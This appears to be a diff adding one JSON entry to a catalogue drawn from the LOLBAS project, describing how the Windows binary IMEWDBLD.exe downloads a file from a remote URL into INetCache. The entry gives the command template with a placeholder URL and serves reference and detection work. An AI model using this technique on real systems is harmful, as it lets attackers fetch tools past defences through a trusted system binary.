@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-imewdbld-exe-download",
+  "name": "LOLBAS · IMEWDBLD.exe (Download)",
+  "command": "C:\\Windows\\System32\\IME\\SHARED\\IMEWDBLD.exe {REMOTEURL}",
+  "description": "IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to INetCache.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "imewdbld",
+    "download"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/IMEWDBLD/",
+  "upstream_id": "IMEWDBLD.exe/Download/0",
+  "category": "lolbas",
+  "subcategory": "download",
+  "references": [
+    {
+      "title": "LOLBAS — IMEWDBLD.exe",
+      "url": "https://lolbas-project.github.io/lolbas/IMEWDBLD/"
+    }
+  ]
+}
